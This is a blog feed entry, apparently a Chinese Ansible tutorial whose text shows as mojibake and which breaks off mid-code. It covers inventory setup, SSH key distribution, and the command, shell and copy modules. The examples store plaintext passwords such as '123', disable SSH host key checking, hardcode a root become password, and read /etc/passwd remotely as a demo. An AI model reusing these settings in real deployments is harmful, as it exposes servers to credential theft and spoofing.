<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Disda</title>
  
  <subtitle>Disdaâ€™s Blog</subtitle>
  <link href="https://disda-coding.github.io/atom.xml" rel="self"/>
  
  <link href="https://disda-coding.github.io/"/>
  <updated>2024-02-20T02:45:43.140Z</updated>
  <id>https://disda-coding.github.io/</id>
  
  <author>
    <name>Disda</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Ansible</title>
    <link href="https://disda-coding.github.io/2024/02/20/Ansible/"/>
    <id>https://disda-coding.github.io/2024/02/20/Ansible/</id>
    <published>2024-02-20T02:44:07.000Z</published>
    <updated>2024-02-20T02:45:43.140Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#ansible">Ansible</a><ul><li><a href="#%E5%AE%89%E8%A3%85">å®‰è£…</a></li><li><a href="#%E9%85%8D%E7%BD%AE">é…ç½®</a><ul><li><a href="#%E9%85%8D%E7%BD%AE%E5%85%AC%E7%A7%81%E9%92%A5%E7%99%BB%E5%BD%95">é…ç½®å…¬ç§é’¥ç™»å½•</a></li></ul></li><li><a href="#%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4">åŸºç¡€å‘½ä»¤</a><ul><li><a href="#%E5%B8%AE%E5%8A%A9%E6%A8%A1%E5%9D%97">å¸®åŠ©æ¨¡å—</a></li><li><a href="#%E8%BF%9E%E9%80%9A%E6%80%A7%E6%B5%8B%E8%AF%95">è¿é€šæ€§æµ‹è¯•</a></li><li><a href="#command%E6%A8%A1%E5%9D%97">commandæ¨¡å—</a></li><li><a href="#shell%E6%A8%A1%E5%9D%97">shellæ¨¡å—</a></li><li><a href="#copy%E6%A8%A1%E5%9D%97">copyæ¨¡å—</a></li></ul></li><li><a href="#%E5%AF%B9%E5%87%9D%E6%80%9D%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%94%AF%E6%8C%81">å¯¹å‡æ€ç³»ç»Ÿçš„æ”¯æŒ</a></li><li><a href="#reference">reference</a></li></ul></li></ul><!-- tocstop --><h1><span id="ansible">Ansible</span></h1><h2><span id="å®‰è£…">å®‰è£…</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install epel-release -y</span><br><span class="line">yum install ansible â€“y</span><br></pre></td></tr></table></figure><h2><span id="é…ç½®">é…ç½®</span></h2><p>ç›®å½•åœ¨<code>/etc/ansible</code>ä¸‹é¢ï¼Œä½¿ç”¨å¯†ç ç™»å½•éœ€è¦ä¿®æ”¹ä»¥ä¸‹ä¸¤ä¸ªé…ç½®æ–‡ä»¶</p><ul><li><p>hostæ–‡ä»¶è§„å®šäº†ç®¡ç†çš„æœºå™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[test]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.20.10.4 ansible_user=sshin ansible_password=123</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.20.10.6 ansible_user=sshin ansible_password=123</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.20.10.7 ansible_user=sshin ansible_password=123</span><br></pre></td></tr></table></figure></li><li><p>ansible.cfgæ˜¯ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œç”¨å¯†ç ç™»å½•éœ€è¦å–æ¶ˆå¦‚ä¸‹æ³¨é‡Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># uncomment this to disable SSH key host checking</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host_key_checking = False</span><br></pre></td></tr></table></figure></li></ul><h3><span id="é…ç½®å…¬ç§é’¥ç™»å½•">é…ç½®å…¬ç§é’¥ç™»å½•</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">- name: Distribute SSH public key</span><br><span class="line">  hosts: test</span><br><span class="line">  become: yes</span><br><span class="line">  become_method: su</span><br><span class="line">  become_flags: &quot;-&quot;</span><br><span class="line">  become_user: root</span><br><span class="line">  vars:</span><br><span class="line">    ansible_become_password: root</span><br><span class="line">  tasks:</span><br><span class="line">    - name: Create authorized_keys directory</span><br><span class="line">      file:</span><br><span class="line">        path: /root/.ssh</span><br><span class="line">        state: directory</span><br><span class="line">        mode: &#x27;0700&#x27;</span><br><span class="line"></span><br><span class="line">    - name: Copy SSH public key</span><br><span class="line">      authorized_key:</span><br><span class="line">        user: root</span><br><span class="line">        key: &quot;&#123;&#123; lookup(&#x27;file&#x27;, &#x27;/root/.ssh/id_rsa.pub&#x27;) &#125;&#125;&quot;</span><br><span class="line">        state: present</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#è¿™é‡Œæˆ‘ä»¬å†™ä¸€ä¸ªé€šç”¨çš„å…¬é’¥åˆ†å‘çš„yamlæ–‡ä»¶:</span><br><span class="line">vim copy_ssh_public_keys.yaml</span><br><span class="line"></span><br><span class="line">  - hosts: test</span><br><span class="line">    user: sshin</span><br><span class="line">    tasks:</span><br><span class="line">     - name: ssh-copy</span><br><span class="line">       authorized_key: user=sshin key=&quot;&#123;&#123; lookup(&#x27;file&#x27;, &#x27;/root/.ssh/id_rsa.pub&#x27;) &#125;&#125;&quot;</span><br><span class="line">       tags:</span><br><span class="line">         - sshkey</span><br><span class="line">ä¼ é€sshå…¬é’¥ï¼š</span><br><span class="line">ansible-playbook /etc/ansible/copy_ssh_public_keys.yaml</span><br><span class="line"></span><br><span class="line">ä¼ å®Œä¹‹åå†æ¬¡æŸ¥çœ‹è¿œç¨‹ä¸»æœºæ˜¯å¦å·²ç»æœ‰äº†authorized_keyæ–‡ä»¶ï¼š</span><br><span class="line">ansible test -a &quot;ls /root/.ssh/&quot;</span><br><span class="line">æ­¤æ—¶åº”è¯¥å¯ä»¥çœ‹åˆ°è¿œç¨‹ä¸»æœºåº”è¯¥å·²ç»æœ‰äº†authorized_keyè¿™ä¸ªæ–‡ä»¶ã€‚</span><br><span class="line"></span><br><span class="line">ansible -i ./hosts test -v -m ping -u root --private-key=/.ssh/id_rsa</span><br></pre></td></tr></table></figure><h2><span id="åŸºç¡€å‘½ä»¤">åŸºç¡€å‘½ä»¤</span></h2><h3><span id="å¸®åŠ©æ¨¡å—">å¸®åŠ©æ¨¡å—</span></h3><p>æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@server ~]# ansible-doc -l |grep mysql</span><br><span class="line">mysql_db                           Add or remove MySQL databases from a remote...</span><br><span class="line">mysql_replication                  Manage MySQL replication                   </span><br><span class="line">mysql_user                         Adds or removes a user from a MySQL databas...</span><br><span class="line">mysql_variables                    Manage MySQL global variables      </span><br><span class="line">[root@server ~]# ansible-doc -s mysql_user</span><br></pre></td></tr></table></figure><h3><span id="è¿é€šæ€§æµ‹è¯•">è¿é€šæ€§æµ‹è¯•</span></h3><p>ä»æœ¬åœ°pingè¿œç¨‹æœºå™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible -i ./hosts --connection=local test -m ping</span><br></pre></td></tr></table></figure><p>æµ‹è¯•æ˜¯å¦å¯sshåˆ°å…¶ä»–æœåŠ¡å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible web -m ping</span><br></pre></td></tr></table></figure><h3><span id="commandæ¨¡å—">commandæ¨¡å—</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible test -m command -a &#x27;ls -l /&#x27;</span><br></pre></td></tr></table></figure><p>å‘½ä»¤æ¨¡å—æ¥å—å‘½ä»¤åç§°ï¼Œåé¢æ˜¯ç©ºæ ¼åˆ†éš”çš„åˆ—è¡¨å‚æ•°ã€‚ç»™å®šçš„å‘½ä»¤å°†åœ¨æ‰€æœ‰é€‰å®šçš„èŠ‚ç‚¹ä¸Šæ‰§è¡Œã€‚å®ƒä¸ä¼šé€šè¿‡shellè¿›è¡Œå¤„ç†ï¼Œæ¯”å¦‚$HOMEå’Œæ“ä½œå¦‚â€&lt;â€ï¼Œâ€&gt;â€ï¼Œâ€|â€ï¼Œâ€;â€ï¼Œâ€&amp;â€ å·¥ä½œï¼ˆéœ€è¦ä½¿ç”¨ï¼ˆshellï¼‰æ¨¡å—å®ç°è¿™äº›åŠŸèƒ½ï¼‰ã€‚æ³¨æ„ï¼Œè¯¥å‘½ä»¤ä¸æ”¯æŒ<code>| ç®¡é“å‘½ä»¤</code>ã€‚ ã€€ä¸‹é¢æ¥çœ‹ä¸€çœ‹è¯¥æ¨¡å—ä¸‹å¸¸ç”¨çš„å‡ ä¸ªå‘½ä»¤ï¼š</p><blockquote><p>chdirã€€ã€€ã€€ã€€ã€€ã€€ # åœ¨æ‰§è¡Œå‘½ä»¤ä¹‹å‰ï¼Œå…ˆåˆ‡æ¢åˆ°è¯¥ç›®å½• executable # åˆ‡æ¢shellæ¥æ‰§è¡Œå‘½ä»¤ï¼Œéœ€è¦ä½¿ç”¨å‘½ä»¤çš„ç»å¯¹è·¯å¾„ free_form ã€€ # è¦æ‰§è¡Œçš„LinuxæŒ‡ä»¤ï¼Œä¸€èˆ¬ä½¿ç”¨Ansibleçš„-aå‚æ•°ä»£æ›¿ã€‚ creates ã€€# ä¸€ä¸ªæ–‡ä»¶åï¼Œå½“è¿™ä¸ªæ–‡ä»¶å­˜åœ¨ï¼Œåˆ™è¯¥å‘½ä»¤ä¸æ‰§è¡Œ,å¯ä»¥ ç”¨æ¥åšåˆ¤æ–­ removes # ä¸€ä¸ªæ–‡ä»¶åï¼Œè¿™ä¸ªæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™è¯¥å‘½ä»¤ä¸æ‰§è¡Œ</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@server ~]# ansible web -m command -a &#x27;removes=/data/aaa.jpg cat /data/a&#x27;    #å¦‚æœ/data/aaa.jpgå­˜åœ¨ï¼Œåˆ™æ‰§è¡Œâ€œcat /data/aâ€å‘½ä»¤</span><br></pre></td></tr></table></figure><h3><span id="shellæ¨¡å—">shellæ¨¡å—</span></h3><p>shellæ¨¡å—å¯ä»¥åœ¨è¿œç¨‹ä¸»æœºä¸Šè°ƒç”¨shellè§£é‡Šå™¨è¿è¡Œå‘½ä»¤ï¼Œæ”¯æŒshellçš„å„ç§åŠŸèƒ½ï¼Œä¾‹å¦‚ç®¡é“ç­‰ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@server ~]# ansible test -m shell -a &#x27;cat /etc/passwd |grep &quot;root&quot;&#x27;</span><br><span class="line">192.168.37.122 | SUCCESS | rc=0 &gt;&gt;</span><br><span class="line">keer:x:10001:1000:keer:/home/keer:/bin/sh</span><br><span class="line"></span><br><span class="line">192.168.37.133 | SUCCESS | rc=0 &gt;&gt;</span><br><span class="line">keer:x:10001:10001::/home/keer:/bin/sh</span><br></pre></td></tr></table></figure><p>ã€€ã€€åªè¦æ˜¯æˆ‘ä»¬çš„shellå‘½ä»¤ï¼Œéƒ½å¯ä»¥é€šè¿‡è¿™ä¸ªæ¨¡å—åœ¨è¿œç¨‹ä¸»æœºä¸Šè¿è¡Œï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸€ä¸¾ä¾‹äº†ã€‚</p><h3><span id="copyæ¨¡å—">copyæ¨¡å—</span></h3><p>è¿™ä¸ªæ¨¡å—ç”¨äºå°†æ–‡ä»¶å¤åˆ¶åˆ°è¿œç¨‹ä¸»æœºï¼ŒåŒæ—¶æ”¯æŒç»™å®šå†…å®¹ç”Ÿæˆæ–‡ä»¶å’Œä¿®æ”¹æƒé™ç­‰ã€‚ ã€€å…¶ç›¸å…³é€‰é¡¹å¦‚ä¸‹ï¼š</p><blockquote><p><code>src</code>ã€€ã€€ã€€ã€€#è¢«å¤åˆ¶åˆ°è¿œç¨‹ä¸»æœºçš„æœ¬åœ°æ–‡ä»¶ã€‚å¯ä»¥æ˜¯ç»å¯¹è·¯å¾„ï¼Œä¹Ÿå¯ä»¥æ˜¯ç›¸å¯¹è·¯å¾„ã€‚å¦‚æœè·¯å¾„æ˜¯ä¸€ä¸ªç›®å½•ï¼Œåˆ™ä¼šé€’å½’å¤åˆ¶ï¼Œç”¨æ³•ç±»ä¼¼äºâ€rsyncâ€ <code>content</code>ã€€ã€€ã€€#ç”¨äºæ›¿æ¢â€srcâ€ï¼Œå¯ä»¥ç›´æ¥æŒ‡å®šæ–‡ä»¶çš„å€¼ <code>dest</code>ã€€ã€€ã€€ã€€#å¿…é€‰é¡¹ï¼Œå°†æºæ–‡ä»¶å¤åˆ¶åˆ°çš„è¿œç¨‹ä¸»æœºçš„<strong>ç»å¯¹è·¯å¾„</strong> <code>backup</code>ã€€ã€€ã€€#å½“æ–‡ä»¶å†…å®¹å‘ç”Ÿæ”¹å˜åï¼Œåœ¨è¦†ç›–ä¹‹å‰æŠŠæºæ–‡ä»¶å¤‡ä»½ï¼Œå¤‡ä»½æ–‡ä»¶åŒ…å«æ—¶é—´ä¿¡æ¯ <code>directory_mode</code>ã€€ã€€ã€€ã€€#é€’å½’è®¾å®šç›®å½•çš„æƒé™ï¼Œé»˜è®¤ä¸ºç³»ç»Ÿé»˜è®¤æƒé™ <code>force</code>ã€€ã€€ã€€ã€€#å½“ç›®æ ‡ä¸»æœºåŒ…å«è¯¥æ–‡ä»¶ï¼Œä½†å†…å®¹ä¸åŒæ—¶ï¼Œè®¾ä¸ºâ€yesâ€ï¼Œè¡¨ç¤ºå¼ºåˆ¶è¦†ç›–ï¼›è®¾ä¸ºâ€noâ€ï¼Œè¡¨ç¤ºç›®æ ‡ä¸»æœºçš„ç›®æ ‡ä½ç½®ä¸å­˜åœ¨è¯¥æ–‡ä»¶æ‰å¤åˆ¶ã€‚é»˜è®¤ä¸ºâ€yesâ€ <code>others</code>ã€€ã€€ã€€ã€€#æ‰€æœ‰çš„ file æ¨¡å—ä¸­çš„é€‰é¡¹å¯ä»¥åœ¨è¿™é‡Œä½¿ç”¨</p></blockquote><p>ç”¨æ³•ä¸¾ä¾‹å¦‚ä¸‹ï¼š <strong>â‘  å¤åˆ¶æ–‡ä»¶ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[root@server ~]# ansible test -m copy -a &#x27;src=~/hello dest=/data/hello&#x27; </span><br><span class="line">192.168.37.122 | SUCCESS =&gt; &#123;</span><br><span class="line">    &quot;changed&quot;: true, </span><br><span class="line">    &quot;checksum&quot;: &quot;22596363b3de40b06f981fb85d82312e8c0ed511&quot;, </span><br><span class="line">    &quot;dest&quot;: &quot;/data/hello&quot;, </span><br><span class="line">    &quot;gid&quot;: 0, </span><br><span class="line">    &quot;group&quot;: &quot;root&quot;, </span><br><span class="line">    &quot;md5sum&quot;: &quot;6f5902ac237024bdd0c176cb93063dc4&quot;, </span><br><span class="line">    &quot;mode&quot;: &quot;0644&quot;, </span><br><span class="line">    &quot;owner&quot;: &quot;root&quot;, </span><br><span class="line">    &quot;size&quot;: 12, </span><br><span class="line">    &quot;src&quot;: &quot;/root/.ansible/tmp/ansible-tmp-1512437093.55-228281064292921/source&quot;, </span><br><span class="line">    &quot;state&quot;: &quot;file&quot;, </span><br><span class="line">    &quot;uid&quot;: 0</span><br><span class="line">&#125;</span><br><span class="line">192.168.37.133 | SUCCESS =&gt; &#123;</span><br><span class="line">    &quot;changed&quot;: true, </span><br><span class="line">    &quot;checksum&quot;: &quot;22596363b3de40b06f981fb85d82312e8c0ed511&quot;, </span><br><span class="line">    &quot;dest&quot;: &quot;/data/hello&quot;, </span><br><span class="line">    &quot;gid&quot;: 0, </span><br><span class="line">    &quot;group&quot;: &quot;root&quot;, </span><br><span class="line">    &quot;md5sum&quot;: &quot;6f5902ac237024bdd0c176cb93063dc4&quot;, </span><br><span class="line">    &quot;mode&quot;: &quot;0644&quot;, </span><br><span class="line">    &quot;owner&quot;: &quot;root&quot;, </span><br><span class="line">    &quot;size&quot;: 12, </span><br><span class="line">    &quot;src&quot;: &quot;/root/.ansible/tmp/ansible-tmp-1512437093.74-44694985235189/source&quot;, </span><br><span class="line">    &quot;state&quot;: &quot;file&quot;, </span><br><span class="line">    &quot;uid&quot;: 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>â‘¡ ç»™å®šå†…å®¹ç”Ÿæˆæ–‡ä»¶ï¼Œå¹¶åˆ¶å®šæƒé™</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[root@server ~]# ansible test -m copy -a &#x27;content=&quot;I am keer\n&quot; dest=/data/name mode=666&#x27;</span><br><span class="line">192.168.37.122 | SUCCESS =&gt; &#123;</span><br><span class="line">    &quot;changed&quot;: true, </span><br><span class="line">    &quot;checksum&quot;: &quot;0421570938940ea784f9d8598dab87f07685b968&quot;, </span><br><span class="line">    &quot;dest&quot;: &quot;/data/name&quot;, </span><br><span class="line">    &quot;gid&quot;: 0, </span><br><span class="line">    &quot;group&quot;: &quot;root&quot;, </span><br><span class="line">    &quot;md5sum&quot;: &quot;497fa8386590a5fc89090725b07f175c&quot;, </span><br><span class="line">    &quot;mode&quot;: &quot;0666&quot;, </span><br><span class="line">    &quot;owner&quot;: &quot;root&quot;, </span><br><span class="line">    &quot;size&quot;: 10, </span><br><span class="line">    &quot;src&quot;: &quot;/root/.ansible/tmp/ansible-tmp-1512437327.37-199512601767687/source&quot;, </span><br><span class="line">    &quot;state&quot;: &quot;file&quot;, </span><br><span class="line">    &quot;uid&quot;: 0</span><br><span class="line">&#125;</span><br><span class="line">192.168.37.133 | SUCCESS =&gt; &#123;</span><br><span class="line">    &quot;changed&quot;: true, </span><br><span class="line">    &quot;checksum&quot;: &quot;0421570938940ea784f9d8598dab87f07685b968&quot;, </span><br><span class="line">    &quot;dest&quot;: &quot;/data/name&quot;, </span><br><span class="line">    &quot;gid&quot;: 0, </span><br><span class="line">    &quot;group&quot;: &quot;root&quot;, </span><br><span class="line">    &quot;md5sum&quot;: &quot;497fa8386590a5fc89090725b07f175c&quot;, </span><br><span class="line">    &quot;mode&quot;: &quot;0666&quot;, </span><br><span class="line">    &quot;owner&quot;: &quot;root&quot;, </span><br><span class="line">    &quot;size&quot;: 10, </span><br><span class="line">    &quot;src&quot;: &quot;/root/.ansible/tmp/ansible-tmp-1512437327.55-218104039503110/source&quot;, </span><br><span class="line">    &quot;state&quot;: &quot;file&quot;, </span><br><span class="line">    &quot;uid&quot;: 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ã€€ã€€æˆ‘ä»¬ç°åœ¨å¯ä»¥å»æŸ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬ç”Ÿæˆçš„æ–‡ä»¶åŠå…¶æƒé™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@server ~]# ansible web -m shell -a &#x27;ls -l /data/&#x27;</span><br><span class="line">192.168.37.122 | SUCCESS | rc=0 &gt;&gt;</span><br><span class="line">total 28</span><br><span class="line">-rw-rw-rw-   1 root root   12 Dec  6 09:45 name</span><br><span class="line"></span><br><span class="line">192.168.37.133 | SUCCESS | rc=0 &gt;&gt;</span><br><span class="line">total 40</span><br><span class="line">-rw-rw-rw- 1 root     root       12 Dec  5 09:45 name</span><br></pre></td></tr></table></figure><p>ã€€ã€€å¯ä»¥çœ‹å‡ºæˆ‘ä»¬çš„nameæ–‡ä»¶å·²ç»ç”Ÿæˆï¼Œå¹¶ä¸”æƒé™ä¸º666ã€‚ <strong>â‘¢ å…³äºè¦†ç›–</strong> ã€€æˆ‘ä»¬æŠŠæ–‡ä»¶çš„å†…å®¹ä¿®æ”¹ä¸€ä¸‹ï¼Œç„¶åé€‰æ‹©è¦†ç›–å¤‡ä»½ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[root@server ~]# ansible test -m copy -a &#x27;content=&quot;I am keerya\n&quot; backup=yes dest=/data/name mode=666&#x27;</span><br><span class="line">192.168.37.122 | SUCCESS =&gt; &#123;</span><br><span class="line">    &quot;backup_file&quot;: &quot;/data/name.4394.2017-12-06@09:46:25~&quot;, </span><br><span class="line">    &quot;changed&quot;: true, </span><br><span class="line">    &quot;checksum&quot;: &quot;064a68908ab9971ee85dbc08ea038387598e3778&quot;, </span><br><span class="line">    &quot;dest&quot;: &quot;/data/name&quot;, </span><br><span class="line">    &quot;gid&quot;: 0, </span><br><span class="line">    &quot;group&quot;: &quot;root&quot;, </span><br><span class="line">    &quot;md5sum&quot;: &quot;8ca7c11385856155af52e560f608891c&quot;, </span><br><span class="line">    &quot;mode&quot;: &quot;0666&quot;, </span><br><span class="line">    &quot;owner&quot;: &quot;root&quot;, </span><br><span class="line">    &quot;size&quot;: 12, </span><br><span class="line">    &quot;src&quot;: &quot;/root/.ansible/tmp/ansible-tmp-1512438383.78-228128616784888/source&quot;, </span><br><span class="line">    &quot;state&quot;: &quot;file&quot;, </span><br><span class="line">    &quot;uid&quot;: 0</span><br><span class="line">&#125;</span><br><span class="line">192.168.37.133 | SUCCESS =&gt; &#123;</span><br><span class="line">    &quot;backup_file&quot;: &quot;/data/name.5962.2017-12-05@09:46:24~&quot;, </span><br><span class="line">    &quot;changed&quot;: true, </span><br><span class="line">    &quot;checksum&quot;: &quot;064a68908ab9971ee85dbc08ea038387598e3778&quot;, </span><br><span class="line">    &quot;dest&quot;: &quot;/data/name&quot;, </span><br><span class="line">    &quot;gid&quot;: 0, </span><br><span class="line">    &quot;group&quot;: &quot;root&quot;, </span><br><span class="line">    &quot;md5sum&quot;: &quot;8ca7c11385856155af52e560f608891c&quot;, </span><br><span class="line">    &quot;mode&quot;: &quot;0666&quot;, </span><br><span class="line">    &quot;owner&quot;: &quot;root&quot;, </span><br><span class="line">    &quot;size&quot;: 12, </span><br><span class="line">    &quot;src&quot;: &quot;/root/.ansible/tmp/ansible-tmp-1512438384.0-170718946740009/source&quot;, </span><br><span class="line">    &quot;state&quot;: &quot;file&quot;, </span><br><span class="line">    &quot;uid&quot;: 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ã€€ã€€ç°åœ¨æˆ‘ä»¬å¯ä»¥å»æŸ¥çœ‹ä¸€ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@server ~]# ansible web -m shell -a &#x27;ls -l /data/&#x27;</span><br><span class="line">192.168.37.122 | SUCCESS | rc=0 &gt;&gt;</span><br><span class="line">total 28</span><br><span class="line">-rw-rw-rw-   1 root root   12 Dec  6 09:46 name</span><br><span class="line">-rw-rw-rw-   1 root root   10 Dec  6 09:45 name.4394.2017-12-06@09:46:25~</span><br><span class="line"></span><br><span class="line">192.168.37.133 | SUCCESS | rc=0 &gt;&gt;</span><br><span class="line">total 40</span><br><span class="line">-rw-rw-rw- 1 root     root       12 Dec  5 09:46 name</span><br><span class="line">-rw-rw-rw- 1 root     root       10 Dec  5 09:45 name.5962.2017-12-05@09:46:24~</span><br></pre></td></tr></table></figure><p>ã€€ã€€å¯ä»¥çœ‹å‡ºï¼Œæˆ‘ä»¬çš„æºæ–‡ä»¶å·²ç»è¢«å¤‡ä»½ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥æŸ¥çœ‹ä¸€ä¸‹<code>name</code>æ–‡ä»¶çš„å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@server ~]# ansible web -m shell -a &#x27;cat /data/name&#x27;</span><br><span class="line">192.168.37.122 | SUCCESS | rc=0 &gt;&gt;</span><br><span class="line">I am keerya</span><br><span class="line"></span><br><span class="line">192.168.37.133 | SUCCESS | rc=0 &gt;&gt;</span><br><span class="line">I am keerya</span><br></pre></td></tr></table></figure><p>ã€€ã€€è¯æ˜ï¼Œè¿™æ­£æ˜¯æˆ‘ä»¬æ–°å¯¼å…¥çš„æ–‡ä»¶çš„å†…å®¹ã€‚</p><h2><span id="å¯¹å‡æ€ç³»ç»Ÿçš„æ”¯æŒ">å¯¹å‡æ€ç³»ç»Ÿçš„æ”¯æŒ</span></h2><p>å¯¹æ–‡ä»¶<code>/usr/lib/python2.7/site-packages/ansible/plugins/become/su.py</code>è¿›è¡Œå¦‚ä¸‹ä¿®æ”¹</p><p>æ·»åŠ <code>bool(b_su_prompt_localizations_re.match(b_output.decode(&#39;gbk&#39;).encode(&#39;utf-8&#39;)))</code>ä½¿å¾—gbkç¼–ç å¾—ä»¥è¢«æ”¯æŒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def 